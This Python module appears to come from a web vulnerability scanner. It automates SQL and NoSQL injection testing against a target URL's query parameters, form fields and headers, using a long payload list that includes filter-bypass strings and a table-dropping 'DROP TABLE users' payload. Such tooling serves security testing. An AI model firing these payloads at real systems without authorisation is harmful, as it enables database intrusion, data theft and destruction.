# backend/attacks/sql_injection.py
import aiohttp
import asyncio
import urllib.parse
import re
import logging
from typing import List, Dict, Any
from dataclasses import dataclass

logger = logging.getLogger(__name__)

@dataclass
class Vulnerability:
    type: str
    severity: str
    parameter: str
    payload: str
    evidence: str
    description: str

class SQLInjectionAttack:
    def __init__(self):
        self.payloads = [
            # Union-based payloads
            "' UNION SELECT NULL, NULL, version()--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
            "' UNION SELECT user(), database(), version()--",
            "' UNION SELECT table_name,column_name,1 FROM information_schema.columns--",
            
            # Boolean-based blind payloads
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            
            # Time-based blind payloads
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "'; SELECT pg_sleep(5)--",
            
            # Error-based payloads
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND extractvalue(1, concat(0x5c, (SELECT version())))--",
            "' AND (SELECT COUNT(*) FROM (SELECT * FROM information_schema.columns)x GROUP BY CONCAT(table_name,FLOOR(RAND(0)*2)))--",
            
            # NoSQL injection payloads
            "' || '1'=='1",
            "'; return true; var x='",
            "'; return this.username == 'admin' && this.password == 'pass'; var x='",
            
            # Common bypass techniques
            "'/**/UNION/**/SELECT",
            "' UNI/**/ON SE/**/LECT",
            "' un/**/ion sel/**/ect",
            "'+UNION+SELECT+",
            "'%20UNION%20SELECT%20",
            
            # Second-order injection
            "admin'--",
            "admin' OR '1'='1'--",
            "admin'; DROP TABLE users;--",
            
            # Advanced payloads
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>64--",
            "' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>5--",
        ]
        
        self.error_patterns = [
            r'mysql_fetch_array\(\)',
            r'ORA-\d{5}',
            r'PostgreSQL.*ERROR',
            r'Warning.*mysql_.*',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'Microsoft JET Database Engine',
            r'ODBC Microsoft Access Driver',
            r'SQLServer JDBC Driver',
            r'Oracle error',
            r'SQL syntax.*MySQL',
            r'Warning.*\Wmysql_',
            r'valid MySQL result',
            r'PostgreSQL query failed',
            r'unterminated quoted string',
            r'Microsoft OLE DB Provider for ODBC Drivers',
            r'Unclosed quotation mark',
            r'Column count doesn\'t match value count'
        ]
        
        self.success_indicators = [
            'mysql',
            'version()',
            'database()',
            'information_schema',
            '@@version',
            'user()',
            'current_user',
            'system_user'
        ]

    async def execute(self, target_url: str, parameters: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Execute SQL injection attack against target URL"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # Test GET parameters
                get_vulns = await self._test_get_parameters(session, target_url)
                vulnerabilities.extend(get_vulns)
                
                # Test POST parameters
                post_vulns = await self._test_post_parameters(session, target_url, parameters)
                vulnerabilities.extend(post_vulns)
                
                # Test headers
                header_vulns = await self._test_headers(session, target_url)
                vulnerabilities.extend(header_vulns)
                
        except Exception as e:
            logger.error(f"SQL injection attack failed: {str(e)}")
            
        return [vuln.__dict__ if hasattr(vuln, '__dict__') else vuln for vuln in vulnerabilities]

    async def _test_get_parameters(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test GET parameters for SQL injection"""
        vulnerabilities = []
        
        try:
            # Parse URL and extract parameters
            parsed_url = urllib.parse.urlparse(target_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            for param_name, param_values in query_params.items():
                for payload in self.payloads:
                    # Create modified parameters
                    modified_params = query_params.copy()
                    modified_params[param_name] = [payload]
                    
                    # Build new URL
                    new_query = urllib.parse.urlencode(modified_params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    vulnerability = await self._send_payload_request(
                        session, test_url, "GET", param_name, payload
                    )
                    
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        
        except Exception as e:
            logger.error(f"GET parameter testing failed: {str(e)}")
            
        return vulnerabilities

    async def _test_post_parameters(self, session: aiohttp.ClientSession, target_url: str, parameters: Dict[str, Any]) -> List[Vulnerability]:
        """Test POST parameters for SQL injection"""
        vulnerabilities = []
        
        if not parameters:
            # Try common parameter names
            parameters = {
                'username': 'admin',
                'password': 'password',
                'id': '1',
                'search': 'test',
                'email': 'test@example.com'
            }
        
        try:
            for param_name, original_value in parameters.items():
                for payload in self.payloads:
                    # Create modified parameters
                    modified_params = parameters.copy()
                    modified_params[param_name] = payload
                    
                    vulnerability = await self._send_payload_request(
                        session, target_url, "POST", param_name, payload, data=modified_params
                    )
                    
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        
        except Exception as e:
            logger.error(f"POST parameter testing failed: {str(e)}")
            
        return vulnerabilities

    async def _test_headers(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test HTTP headers for SQL injection"""
        vulnerabilities = []
        
        # Headers commonly vulnerable to SQL injection
        test_headers = [
            'User-Agent',
            'X-Forwarded-For',
            'X-Real-IP',
            'Referer',
            'Cookie',
            'Authorization'
        ]
        
        try:
            for header_name in test_headers:
                for payload in self.payloads[:10]:  # Test subset for headers
                    headers = {header_name: payload}
                    
                    vulnerability = await self._send_payload_request(
                        session, target_url, "GET", header_name, payload, headers=headers
                    )
                    
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        
        except Exception as e:
            logger.error(f"Header testing failed: {str(e)}")
            
        return vulnerabilities

    async def _send_payload_request(
        self, 
        session: aiohttp.ClientSession, 
        url: str, 
        method: str, 
        param_name: str, 
        payload: str,
        data: Dict = None,
        headers: Dict = None
    ) -> Vulnerability:
        """Send request with payload and analyze response"""
        
        try:
            if method == "GET":
                async with session.get(url, headers=headers) as response:
                    response_text = await response.text()
                    status_code = response.status
            else:
                async with session.post(url, data=data, headers=headers) as response:
                    response_text = await response.text()
                    status_code = response.status
                    
            # Analyze response for SQL injection indicators
            vulnerability = self._analyze_response(
                response_text, status_code, param_name, payload
            )
            
            return vulnerability
            
        except asyncio.TimeoutError:
            # Time-based SQL injection detected
            return Vulnerability(
                type="SQL Injection",
                severity="high",
                parameter=param_name,
                payload=payload,
                evidence="Request timeout - possible time-based SQL injection",
                description="Time-based blind SQL injection vulnerability detected. The application appears to execute SQL queries based on user input, causing delays in response."
            )
        except Exception as e:
            logger.debug(f"Request failed for payload {payload}: {str(e)}")
            return None

    def _analyze_response(self, response_text: str, status_code: int, param_name: str, payload: str) -> Vulnerability:
        """Analyze response for SQL injection indicators"""
        
        response_lower = response_text.lower()
        
        # Check for SQL error messages
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return Vulnerability(
                    type="SQL Injection",
                    severity="high",
                    parameter=param_name,
                    payload=payload,
                    evidence=f"SQL error pattern detected: {pattern}",
                    description="Error-based SQL injection vulnerability detected. The application reveals database error messages that can be exploited to extract sensitive information."
                )
        
        # Check for successful SQL injection indicators
        for indicator in self.success_indicators:
            if indicator.lower() in response_lower:
                return Vulnerability(
                    type="SQL Injection",
                    severity="critical",
                    parameter=param_name,
                    payload=payload,
                    evidence=f"SQL injection success indicator found: {indicator}",
                    description="Union-based SQL injection vulnerability detected. The application executes arbitrary SQL queries, potentially allowing complete database compromise."
                )
        
        # Check for unusual status codes
        if status_code == 500:
            return Vulnerability(
                type="SQL Injection",
                severity="medium",
                parameter=param_name,
                payload=payload,
                evidence=f"Internal server error (500) triggered by payload",
                description="Potential SQL injection vulnerability detected. The payload caused an internal server error, suggesting the application may be vulnerable to SQL injection attacks."
            )
        
        # Boolean-based detection (requires baseline comparison)
        if len(response_text) > 0 and self._is_boolean_injection(payload, response_text):
            return Vulnerability(
                type="SQL Injection",
                severity="high",
                parameter=param_name,
                payload=payload,
                evidence="Boolean-based SQL injection detected through response analysis",
                description="Boolean-based blind SQL injection vulnerability detected. The application processes SQL queries differently based on true/false conditions, allowing data extraction through inference."
            )
        
        return None

    def _is_boolean_injection(self, payload: str, response_text: str) -> bool:
        """Simple heuristic for boolean-based SQL injection detection"""
        # This is a simplified version - in a real implementation, you'd need baseline requests
        true_conditions = ["' AND '1'='1", "' AND 1=1--"]
        false_conditions = ["' AND '1'='2", "' AND 1=2--"]
        
        # If payload is a true condition and response has content
        if payload in true_conditions and len(response_text) > 1000:
            return True
            
        # If payload is a false condition and response is shorter/different
        if payload in false_conditions and len(response_text) < 500:
            return True
            
        return False